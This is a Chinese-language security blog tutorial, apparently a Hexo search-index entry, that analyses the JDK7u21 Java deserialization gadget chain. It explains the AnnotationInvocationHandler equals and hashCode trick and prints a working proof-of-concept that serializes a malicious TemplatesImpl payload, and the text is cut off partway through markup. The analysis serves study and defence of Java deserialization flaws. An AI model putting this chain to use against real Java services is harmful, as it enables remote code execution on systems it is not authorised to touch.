<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JAVA-原生反序列化利用链JDK7u21</title>
      <link href="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/"/>
      <url>/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/</url>
      
        <content type="html"><![CDATA[<h1 id="说两句"><a href="#说两句" class="headerlink" title="说两句"></a>说两句</h1><p>在前面的分析利用链中，大部分都基于 InvokerTransformer 和 TemplatesImpl 这两个类去执行命令，而其他的一些利用链也是经过这两个类去进行变形，从而产生新的利用链，而在Jdk7u21中，也是基于 TemplatesImpl 去实现的，另一个核心点就是 </p><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><p>我们先来看看 这个老朋友AnnotationInvocationHandler类中的equalsImpl方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">private Boolean equalsImpl(Object var1) &#123;  </span><br><span class="line">    if (var1 == this) &#123;  </span><br><span class="line">        return true;  </span><br><span class="line">    &#125; else if (!this.type.isInstance(var1)) &#123;  </span><br><span class="line">        return false;  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        Method[] var2 = this.getMemberMethods();  </span><br><span class="line">        int var3 = var2.length;  </span><br><span class="line">  </span><br><span class="line">        for(int var4 = 0; var4 &lt; var3; ++var4) &#123;  </span><br><span class="line">            Method var5 = var2[var4];  </span><br><span class="line">            String var6 = var5.getName();  </span><br><span class="line">            Object var7 = this.memberValues.get(var6);  </span><br><span class="line">            Object var8 = null;  </span><br><span class="line">            AnnotationInvocationHandler var9 = this.asOneOfUs(var1);  </span><br><span class="line">            if (var9 != null) &#123;  </span><br><span class="line">                var8 = var9.memberValues.get(var6);  </span><br><span class="line">            &#125; else &#123;  </span><br><span class="line">                try &#123;  </span><br><span class="line">                    var8 = var5.invoke(var1);  </span><br><span class="line">                &#125; catch (InvocationTargetException var11) &#123;  </span><br><span class="line">                    return false;  </span><br><span class="line">                &#125; catch (IllegalAccessException var12) &#123;  </span><br><span class="line">                    throw new AssertionError(var12);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            if (!memberValueEquals(var7, var8)) &#123;  </span><br><span class="line">                return false;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        return true;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> /**/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private Method[] getMemberMethods() &#123;  </span><br><span class="line">    if (this.memberMethods == null) &#123;  </span><br><span class="line">        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() &#123;  </span><br><span class="line">            public Method[] run() &#123;  </span><br><span class="line">                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();  </span><br><span class="line">                AccessibleObject.setAccessible(var1, true);  </span><br><span class="line">                return var1;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    return this.memberMethods;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先来看equalsImpl()  方法<br><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/1.jpg"></p><p>跟进这个  getMemberMethods() 方法，可以知道 这是遍历 this.type 这个对象的所有方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">private Method[] getMemberMethods() &#123;  </span><br><span class="line">    if (this.memberMethods == null) &#123;  </span><br><span class="line">        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() &#123;  </span><br><span class="line">            public Method[] run() &#123;  </span><br><span class="line">                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();  </span><br><span class="line">                AccessibleObject.setAccessible(var1, true);  </span><br><span class="line">                return var1;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    return this.memberMethods;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说，equalsImpl()  这个方法是将 this.type 类中的所有方法都遍历执行了，那么，假设 this.type 是Templates 类，那么一定会调用到 其中的  newTransformer() 或者 getOutputProperties() 方法，进而触发任意代码执行  ， 这就是JDK7u21 的核心原理~</p><h1 id="寻找-equalsImpl-调用链"><a href="#寻找-equalsImpl-调用链" class="headerlink" title="寻找 equalsImpl 调用链"></a>寻找 equalsImpl 调用链</h1><p>我们现在的目标就是为了调用这个 equalsimpl ，而 equalsimpl 是一个  private 私有方法，在 AnnotationInvocationHandler#invoke 中被调用。<br><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/2.jpg"></p><p>AnnotationInvocationHandler 是 一个InvocationHandler 接口的实现， InvocationHandler是一个接口，他只有一个方法就是invoke：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    public Object invoke(Object proxy, Method method, Object[] args)  </span><br><span class="line">        throws Throwable;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在使用 java.reflect.Proxy 动态绑定一个接口时，如果调用该接口中任意一个方法，会执行到 InvocationHandler#invoke 。执行invoke时，被传入的第一个参数是这个proxy对象，第二个参数是 被执行的方法名，第三个参数是执行时的参数列表。</p><p>我们来看看 AnnotationInvocationHandler#invoke</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public Object invoke(Object var1, Method var2, Object[] var3) &#123;  </span><br><span class="line">    String var4 = var2.getName();  </span><br><span class="line">    Class[] var5 = var2.getParameterTypes();  </span><br><span class="line">    if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;  </span><br><span class="line">        return this.equalsImpl(var3[0]);  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        assert var5.length == 0;  </span><br><span class="line">  </span><br><span class="line">        if (var4.equals(&quot;toString&quot;)) &#123;  </span><br><span class="line">            return this.toStringImpl();  </span><br><span class="line">        &#125; else if (var4.equals(&quot;hashCode&quot;)) &#123;  </span><br><span class="line">            return this.hashCodeImpl();  </span><br><span class="line">        &#125; else if (var4.equals(&quot;annotationType&quot;)) &#123;  </span><br><span class="line">            return this.type;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.................</span><br></pre></td></tr></table></figure><p>如果 传入的方法名 为  “equals”  且方法仅有一个类型参数时，就会调用 equalsImpl()</p><p>所以我们要找到一个方法， 反序列化时 对proxy 调用 equals 方法</p><h1 id="找到equals-调用链"><a href="#找到equals-调用链" class="headerlink" title="找到equals 调用链"></a>找到equals 调用链</h1><p>在上篇我们遇到，和equals 类似的 用法有另一个方法， <code>CompareTo</code>  他通常被实现用于比较两个对象的值是是否相等，但他用的 compareTo 方法，并不是我们需要的 equals，另一个常见的会调用 equals 的场景就是 集合Set ，Set 中储存的 对象不允许重复，所以在添加对象时，一定会触碰到对比的操作 。</p><p>我们来看一下 HashSet 的ReadObject 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    private void readObject(java.io.ObjectInputStream s)  </span><br><span class="line">        throws java.io.IOException, ClassNotFoundException &#123;  </span><br><span class="line">        // Read in any hidden serialization magic  </span><br><span class="line">        s.defaultReadObject();  </span><br><span class="line">  </span><br><span class="line">        // Read in HashMap capacity and load factor and create backing HashMap  </span><br><span class="line">        int capacity = s.readInt();  </span><br><span class="line">        float loadFactor = s.readFloat();  </span><br><span class="line">        map = (((HashSet)this) instanceof LinkedHashSet ?  </span><br><span class="line">               new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :  </span><br><span class="line">               new HashMap&lt;E,Object&gt;(capacity, loadFactor));  </span><br><span class="line">  </span><br><span class="line">        // Read in size  </span><br><span class="line">        int size = s.readInt();  </span><br><span class="line">  </span><br><span class="line">        // Read in all elements in the proper order.  </span><br><span class="line">        for (int i=0; i&lt;size; i++) &#123;  </span><br><span class="line">            E e = (E) s.readObject();  </span><br><span class="line">            map.put(e, PRESENT);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>map</code>也是瞬态属性。这里得到的很明显是<code>HashMap</code>，然后依次从<code>s.readObject()</code>里面读取key，然后调用<code>map.put</code>方法放进去，因为也说了，<code>HashSet</code>的底层实现还是<code>HashMap</code>， 还要说一点， 哈希表其实是由 数组 + 链表实现的， 哈希表 底层 保存在一个数组中，数组的索引是由哈希表的键的hash值计算得到的 ，也就是 key.hashcode() , 数组的值是一个链表，所有hash碰撞到相同索引的key-value，都会被链接到 链表后面 ，这里借用 p牛的一张图 </p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/3.jpg"></p><p>我们跟进一下这里的 put 方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;  </span><br><span class="line">    if (key == null)  </span><br><span class="line">        return putForNullKey(value);  </span><br><span class="line">    int hash = hash(key);  </span><br><span class="line">    int i = indexFor(hash, table.length);  </span><br><span class="line">    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;  </span><br><span class="line">        Object k;  </span><br><span class="line">        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;  </span><br><span class="line">            V oldValue = e.value;  </span><br><span class="line">            e.value = value;  </span><br><span class="line">            e.recordAccess(this);  </span><br><span class="line">            return oldValue;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以发现 对放入的 key进行了 hash，看见这里的  if 方法内，如果当前的map 中 有hash值相同的key，就会 key.equals(k) 如果 key 是代理对象，k 为TemplatesImpl ，则此时会调用  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.invoke-&gt;AnnotationInvocationHandler.equalsImpl-&gt;TemplatesImpl.newTransformer</span><br></pre></td></tr></table></figure><p>从而执行命令， 所以我觉得，能找到这条链子的师傅实在是实力强👍</p><p>计算  “哈希” 的主要是下面这两行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int hash = hash(key);  </span><br><span class="line">int i = indexFor(hash, table.length);</span><br></pre></td></tr></table></figure><p>跟进 hash()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">final int hash(Object k) &#123;  </span><br><span class="line">    int h = 0;</span><br><span class="line">h ^= k.hashCode();  </span><br><span class="line">  </span><br><span class="line">h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);  </span><br><span class="line">    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>除了 调用hashCode 外，没有其他的东西，所以 proxy 对象 与TemplateImpl   是否相等，取决于这两个对象的 hashcode() 是否相等。那我们就来看看这两个方法，首先是 TemplatesImpl 的hashcode 方法，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class Test7u21 &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        TemplatesImpl templates2 = new TemplatesImpl();  </span><br><span class="line">        System.out.println(&quot;temp2:&quot;+templates.hashCode());  </span><br><span class="line">        System.out.println(&quot;temp2:&quot;+ templates2.hashCode());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/4.jpg"></p><p>发现他每次 的hashCode 后的值都不唯一，Debug 也无法跟踪调试，而是直接打印了其hash值，网上说是 Native 方法 ，那么什么是Native方法？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">native 是用做java 和其他语言（如c++）进行协作时使用的，也就是native 后的函数的实现不是用java写的。  </span><br><span class="line">既然都不是java，那就别管它的源代码了，我们只需要知道这个方法已经被实现即可。  </span><br><span class="line">native的意思就是通知操作系统， 这个函数你必须给我实现，因为我要使用。 所以native关键字的函数都是操作系统实现的， java只能调用。  </span><br><span class="line">java是跨平台的语言，既然是跨了平台，所付出的代价就是牺牲一些对底层的控制，而java要实现对底层的控制，就需要一些其他语言的帮助，这个就是native的作用了。</span><br></pre></td></tr></table></figure><p>虽然如此，我们不难发现， 每次运行 其hash 都在改变，所以想让 proxy 的hashCode 与其相等，只能寄希望于 proxy.hashCode() ….</p><p>再想想代理对象的hashCode 方法，既然是代理对象，调用其 hashCode() 很明显会调用到 AnnotationInvocationHandler#invoke 进而调用到 AnnotationInvocationHandler#hashCodeImpl：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#125; else if (var4.equals(&quot;hashCode&quot;)) &#123;  </span><br><span class="line">    return this.hashCodeImpl();</span><br></pre></td></tr></table></figure><p>进入此方法 看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private int hashCodeImpl() &#123; </span><br><span class="line">int result = 0; </span><br><span class="line">for (Map.Entry e : memberValues.entrySet()) &#123; </span><br><span class="line">result += (127 * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue()); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">return result; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单来说，就是遍历这个 memberValues这个Map ，把每次计算出来的  127*(key的hash)^(value的hash)  </p><p>开发出这链子的作者很牛逼，他想到让这个 memberValues这个Map 只有一个键值对，让key 的hash为 0  ，这样 127*0 &#x3D; 0  ，然后0 ^ xxx 仍然是xxx (相同为0  ，不同为1)，再让value 是恶意的 TemplatesImpl对象，这样计算的就是那个 <code>TemplatesImpl</code>对象的hash值 自然就 两个hash 相等了。</p><p>不得不说 nbbbbbbb</p><p>所以我们找到一个 hashCode 是 0 的对象作为 memberValues 的key，将恶意TemplateImpl对象作为 value，这个proxy计算的hashCode就与TemplateImpl对象本身的hashCode相等了。</p><p>找一个hashCode 是 0 的对象，我们可以写一个脚本爆破一下 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class Test7u21 &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        for (long i = 0; i &lt; 9999999999L; i++) &#123;  </span><br><span class="line">            if (Long.toHexString(i).hashCode() == 0)&#123;  </span><br><span class="line">                System.out.println(Long.toHexString(i));  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本跑出来的是 f5a5a608 </p><h1 id="利用链整理"><a href="#利用链整理" class="headerlink" title="利用链整理"></a>利用链整理</h1><p>说了这么多，想必脑子也昏昏的了，这里就整理一下过程</p><ul><li>首先 第一步肯定是 生成 TemplateImpl 恶意对象</li><li>实例化 AnnotationInvocationHandler对象 <ul><li>他的type属性是一个 TemplateImpl 类(因为getMemberMethods会遍历其方法)</li><li>他的memberValues属性是一个Map，Map只有一个Key和Value，Key是f5a5a608，value是TemplateImpl类</li></ul></li><li>对 AnnotationInvocationHandler对象做一层代理，生成proxy 对象(因为要进入invoke 调用hashcode)</li><li>实例化一个HashSet 这个 HashSet 有两个元素 分别是<ul><li>TemplateImpl对象</li><li>proxy对象</li></ul></li><li>将HashSet 对象序列化</li></ul><p>反序列化触发代码如下：</p><ul><li>触发HashSet的readobject方法，其中 使用HashMap的Key去重</li><li>去重时计算HashSet中的两个元素的 hashCode() ，因为我们的静心构造二者相等，进而触发 equals() 方法</li><li>调用 AnnotationInvocationHandler#equalsImpl 方法</li><li>equalsImpl 中遍历 this.type 的每个方法并调用</li><li>因为 this.type 是TemplatesImpl类，所以触发了 newTransform() 或 getOutputProperties() 方法</li><li>代码执行</li></ul><p>按我的理解简单来说，就是利用hashCodeImpl() 使 两者的key的hash相同，就会进行比较，调用 equals方法，从而进行漏洞利用。<br>让我震惊的就是equals的调用和这个hash值的构造，属实tql</p><p>POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import org.apache.commons.codec.binary.Base64;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.LinkedHashSet;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class JDK7u21 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        String zeroHashCodeStr = &quot;f5a5a608&quot;;</span><br><span class="line"></span><br><span class="line">        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span><br><span class="line">        HashMap map = new HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, &quot;foo&quot;);</span><br><span class="line"></span><br><span class="line">        // 实例化AnnotationInvocationHandler类</span><br><span class="line">        Constructor handlerConstructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handlerConstructor.setAccessible(true);</span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        // 为tempHandler创造一层代理</span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, tempHandler);</span><br><span class="line"></span><br><span class="line">        // 实例化HashSet，并将两个对象放进去</span><br><span class="line">        HashSet set = new LinkedHashSet();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        // 将恶意templates设置到map中</span><br><span class="line">        map.put(zeroHashCodeStr, templates);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(set);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我会给大家剖析 POC 怎么构造的，深刻理解POC原理</p><p>雷打不动的 TemplatesImpl对象设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">SerializeUtil.setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;evilCode&#125;);</span><br><span class="line">SerializeUtil.setFieldValue(templates,&quot;_name&quot;,&quot;Ku1s&quot;);</span><br></pre></td></tr></table></figure><p>然后是 new 一个 AnnotationInvocationHandler对象，看看他的构造器：</p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/5.jpg"></p><p>前面也说过，type 是 TemplatesImpl对象，将循环调用他全部方法，而memberMethods 是一个键值对，其Key 是 0 ，value 则是 TemplatesImpl.hash 。</p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/6.jpg"></p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/7.png"></p><p>所以我们 先创建一个 memberMethods ，我们也说过，他本质上是个HashMap ，添加其值，我们先不把TemplatesImpl 放进 memberValues的value，待会会说为什么，然后再实例化 AnnotationInvocationHandler，进行初始化构造(因为此类无法new 所以要 class.forname) ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;String, Object&gt; memberValue = new HashMap&lt;String, Object&gt;();  </span><br><span class="line">memberValue.put(&quot;f5a5a608&quot;,&quot;Ku1s&quot;);  </span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class); //得到构造器  </span><br><span class="line">constructor.setAccessible(true);  </span><br><span class="line">InvocationHandler  handler = (InvocationHandler) constructor.newInstance(Templates.class, memberValue); //实例化</span><br></pre></td></tr></table></figure><p>然后就是生成动态代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Templates proxy = (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>然后就是生成反序列化链的起点，那个<code>HashSet</code>对象了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashSet hashSet = new LinkedHashSet();</span><br><span class="line">hashSet.add(templates);</span><br><span class="line">hashSet.add(proxy);</span><br><span class="line">memberValues.put(&quot;f5a5a608&quot;,templates);</span><br></pre></td></tr></table></figure><p>这里再覆盖掉<code>f5a5a608</code>的value，就是为了防止这里的2次<code>add</code>直接触发了漏洞。 </p><p>完整POC：<br>JDK7u21.class</p><figure class="highlight plaintext"><table><tr><td 